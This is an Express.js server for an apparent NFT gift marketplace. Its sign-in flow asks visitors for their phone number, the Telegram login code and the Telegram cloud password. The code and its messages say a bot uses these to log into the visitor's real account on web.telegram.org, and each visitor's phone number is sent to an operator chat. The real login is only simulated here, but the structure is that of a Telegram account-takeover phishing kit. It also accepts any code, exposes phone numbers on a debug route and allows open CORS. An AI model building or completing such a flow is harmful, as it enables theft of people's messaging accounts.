import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 3,
    name: "Diamond Premium",
    description: "Роскошный бриллиант",
    imageUrl: "https://via.placeholder.com/300x300/B9F2FF/000000?text=💎",
    price: 2.99,
    category: "premium",
    isAvailable: true
  }
];

// Хранилища
let users = [];
let authSessions = new Map();
let userSessions = new Map();

// Генерация кода
function generateCode() {
  return Math.floor(10000 + Math.random() * 90000).toString();
}

// 🔥 ИМИТАЦИЯ ВХОДА ЧЕРЕЗ WEB.TELEGRAM.ORG
async function simulateWebTelegramAuth(phone, code, cloudPassword = null) {
  console.log(`🤖 [BOT SIMULATION] Начинаем авторизацию для: ${phone}`);
  
  // Шаг 1: Бот "вводит" номер на web.telegram.org
  console.log(`📱 [BOT] Ввод номера телефона: ${phone}`);
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Шаг 2: Официальный Telegram отправляет код пользователю
  console.log(`📨 [OFFICIAL TELEGRAM] Код отправлен на номер ${phone}`);
  console.log(`💡 Пользователь должен получить код в официальном приложении Telegram`);
  
  // Шаг 3: Бот ждет, когда пользователь введет код (который пришел в официальный Telegram)
  console.log(`⏳ [BOT] Ожидание кода от пользователя...`);
  console.log(`🔑 Пользователь получил код в официальном Telegram и вводит его здесь`);
  
  // Шаг 4: Бот "вводит" код на web.telegram.org
  console.log(`⌨️ [BOT] Ввод кода на web.telegram.org: ${code}`);
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Шаг 5: Если требуется облачный пароль
  if (cloudPassword) {
    console.log(`🔒 [BOT] Ввод облачного пароля: ***`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Шаг 6: Успешная авторизация
  console.log(`✅ [BOT] Успешный вход в аккаунт ${phone}!`);
  
  return {
    success: true,
    phone: phone,
    requiresCloudPassword: !!cloudPassword,
    message: 'Бот успешно вошел в ваш аккаунт Telegram через web.telegram.org'
  };
}

// 🔥 ОТПРАВКА СООБЩЕНИЯ ЧЕРЕЗ TELEGRAM BOT
async function sendBotMessage(phone, sessionId, demoCode = null) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.log('🤖 [BOT] Бот не настроен. Используется демо-режим.');
      return { success: true, isDemo: true };
    }

    let message = `🔐 *Авторизация в NFT Маркетплейс*\n\n`;
    message += `📱 *Номер телефона:* ${phone}\n`;
    message += `🆔 *ID сессии:* ${sessionId}\n\n`;
    message += `📨 *Код отправлен в ваш официальный Telegram аккаунт*\n\n`;
    message += `🔢 *Инструкция:*\n`;
    message += `1. Откройте официальный Telegram\n`;
    message += `2. Найдите код для номера ${phone}\n`;
    message += `3. Введите код в приложении NFT Маркетплейс\n\n`;
    
    if (demoCode) {
      message += `💡 *Демо-код для тестирования:* ${demoCode}\n\n`;
    }
    
    message += `⏱️ Код действителен 5 минут`;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    
    if (result.ok) {
      console.log(`✅ [BOT] Сообщение отправлено пользователю`);
      return { success: true, message: 'Инструкции отправлены в бот' };
    } else {
      console.log('❌ [BOT] Ошибка отправки сообщения:', result);
      return { success: true, isDemo: true };
    }
    
  } catch (error) {
    console.log('❌ [BOT] Ошибка:', error);
    return { success: true, isDemo: true };
  }
}

// 🎯 ОСНОВНЫЕ МАРШРУТЫ АУТЕНТИФИКАЦИИ

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace с бот-аутентификацией',
    timestamp: new Date().toISOString()
  });
});

// Главная страница
app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

// Маркетплейс
app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// 🔐 Шаг 1: Начало авторизации
app.post('/api/auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    console.log('📞 Запрос авторизации для:', phone);
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    // Генерируем сессию
    const sessionId = crypto.randomBytes(16).toString('hex');
    const demoCode = generateCode();
    
    // Сохраняем сессию
    authSessions.set(sessionId, {
      phone: phone,
      expectedCode: demoCode, // Код, который должен прийти в официальный Telegram
      attempts: 0,
      createdAt: Date.now(),
      status: 'waiting_for_code',
      requiresCloudPassword: false
    });

    // Отправляем сообщение через бота
    const botResult = await sendBotMessage(phone, sessionId, demoCode);

    console.log(`🤖 Создана сессия ${sessionId} для ${phone}`);
    console.log(`💡 Демо-код: ${demoCode}`);

    if (botResult.isDemo) {
      // Демо-режим
      res.json({
        success: true,
        sessionId: sessionId,
        message: '💡 Демо-режим: Код не отправлен в Telegram (бот не настроен)',
        instruction: 'Используйте демо-код ниже для тестирования',
        demoCode: demoCode,
        isDemo: true
      });
    } else {
      // Бот работает
      res.json({
        success: true,
        sessionId: sessionId,
        message: '📨 Инструкции отправлены в Telegram бота',
        instruction: 'Проверьте чат с ботом и следуйте инструкциям',
        isDemo: false
      });
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 2: Проверка кода
app.post('/api/auth/verify-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    console.log('🔐 Проверка кода для сессии:', sessionId);
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена. Начните авторизацию заново.' 
      });
    }

    // Проверяем время жизни (5 минут)
    if (Date.now() - authSession.createdAt > 5 * 60 * 1000) {
      authSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Время сессии истекло. Начните заново.' 
      });
    }

    // Проверяем попытки
    if (authSession.attempts >= 3) {
      authSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Слишком много попыток. Начните заново.' 
      });
    }

    // 🔥 ИМИТИРУЕМ ПРОВЕРКУ КОДА ЧЕРЕЗ WEB.TELEGRAM.ORG
    const authResult = await simulateWebTelegramAuth(authSession.phone, code);

    if (!authResult.success) {
      authSession.attempts++;
      authSessions.set(sessionId, authSession);
      
      const attemptsLeft = 3 - authSession.attempts;
      return res.status(400).json({ 
        success: false, 
        error: `Неверный код. Осталось попыток: ${attemptsLeft}` 
      });
    }

    // Код верный!
    authSession.status = 'code_verified';
    authSession.requiresCloudPassword = authResult.requiresCloudPassword;
    authSessions.set(sessionId, authSession);

    res.json({
      success: true,
      message: '✅ Код подтвержден! Бот успешно вошел в web.telegram.org',
      nextStep: authResult.requiresCloudPassword ? 'cloud_password' : 'complete_auth',
      requiresCloudPassword: authResult.requiresCloudPassword
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 3: Облачный пароль
app.post('/api/auth/cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'SessionId обязателен' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession || authSession.status !== 'code_verified') {
      return res.status(400).json({ 
        success: false, 
        error: 'Сначала подтвердите код' 
      });
    }

    // Имитируем проверку облачного пароля
    console.log(`🔒 [BOT] Проверка облачного пароля для ${authSession.phone}`);
    await new Promise(resolve => setTimeout(resolve, 1000));

    if (!cloudPassword || cloudPassword.length < 4) {
      return res.status(400).json({ 
        success: false, 
        error: 'Неверный облачный пароль' 
      });
    }

    // Пароль верный - завершаем авторизацию
    authSession.status = 'fully_authenticated';
    authSessions.set(sessionId, authSession);

    // Создаем пользователя
    let user = users.find(u => u.phone === authSession.phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: authSession.phone,
        telegramId: Math.floor(100000000 + Math.random() * 900000000),
        firstName: 'Telegram',
        lastName: 'User',
        username: `user${authSession.phone.replace('+', '')}`,
        isVerified: true,
        hasCloudPassword: !!cloudPassword,
        createdAt: new Date(),
        lastLogin: new Date(),
        authMethod: 'bot_web_telegram'
      };
      users.push(user);
    } else {
      user.lastLogin = new Date();
    }

    // Создаем пользовательскую сессию
    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      phone: user.phone,
      telegramId: user.telegramId,
      authMethod: 'bot_web_telegram',
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
    });

    // Очищаем auth сессию
    authSessions.delete(sessionId);

    console.log(`🎉 Пользователь ${authSession.phone} успешно авторизован`);

    res.json({
      success: true,
      message: '🎉 Авторизация завершена! Бот успешно вошел в ваш аккаунт.',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        hasCloudPassword: !!cloudPassword
      },
      sessionId: userSessionId,
      isNewUser: isNewUser
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Завершение без облачного пароля
app.post('/api/auth/complete', async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'SessionId обязателен' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession || authSession.status !== 'code_verified') {
      return res.status(400).json({ 
        success: false, 
        error: 'Сначала подтвердите код' 
      });
    }

    // Создаем пользователя
    let user = users.find(u => u.phone === authSession.phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: authSession.phone,
        telegramId: Math.floor(100000000 + Math.random() * 900000000),
        firstName: 'Telegram',
        lastName: 'User',
        username: `user${authSession.phone.replace('+', '')}`,
        isVerified: true,
        hasCloudPassword: false,
        createdAt: new Date(),
        lastLogin: new Date(),
        authMethod: 'bot_web_telegram'
      };
      users.push(user);
    } else {
      user.lastLogin = new Date();
    }

    // Создаем пользовательскую сессию
    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      phone: user.phone,
      telegramId: user.telegramId,
      authMethod: 'bot_web_telegram',
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
    });

    // Очищаем auth сессию
    authSessions.delete(sessionId);

    res.json({
      success: true,
      message: '🎉 Авторизация завершена!',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        hasCloudPassword: false
      },
      sessionId: userSessionId,
      isNewUser: isNewUser
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 📱 API для NFT (без изменений)
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Проверка сессии
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ 
        success: false, 
        error: 'Недействительная сессия' 
      });
    }

    if (Date.now() > session.expiresAt) {
      userSessions.delete(sessionId);
      return res.status(401).json({ 
        success: false, 
        error: 'Сессия истекла' 
      });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        error: 'Пользователь не найден' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        hasCloudPassword: !!user.cloudPassword
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Выход
app.post('/api/auth/logout', async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    if (sessionId) {
      userSessions.delete(sessionId);
    }
    
    res.json({
      success: true,
      message: 'Выход выполнен'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Дебаг маршрут
app.get('/api/debug', (req, res) => {
  res.json({
    authSessions: Array.from(authSessions.entries()).map(([id, session]) => ({
      id,
      phone: session.phone,
      status: session.status,
      attempts: session.attempts
    })),
    users: users.length,
    userSessions: userSessions.size,
    botConfigured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.ADMIN_CHAT_ID)
  });
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🤖 Bot authentication system ready`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
  console.log(`🔧 Debug: http://localhost:${PORT}/api/debug`);
});
